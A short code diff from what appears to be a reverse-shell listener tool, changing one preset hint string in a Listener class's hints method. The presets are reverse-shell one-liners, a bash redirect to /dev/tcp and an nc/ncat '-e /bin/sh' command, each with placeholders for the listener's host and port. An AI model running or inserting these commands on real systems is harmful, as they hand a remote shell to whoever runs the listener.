@@ -716,7 +716,7 @@ class Listener:
 	def hints(self):
 		presets=[
 			'bash -c "/bin/bash >& /dev/tcp/{}/{} 0>&1 &"',
-			'nc -e /bin/sh {} {}'
+			'ncat -e /bin/sh {} {}'
 		]
 		output=[paint(f"[{self} Hints] ===========---",'yellow')]
 
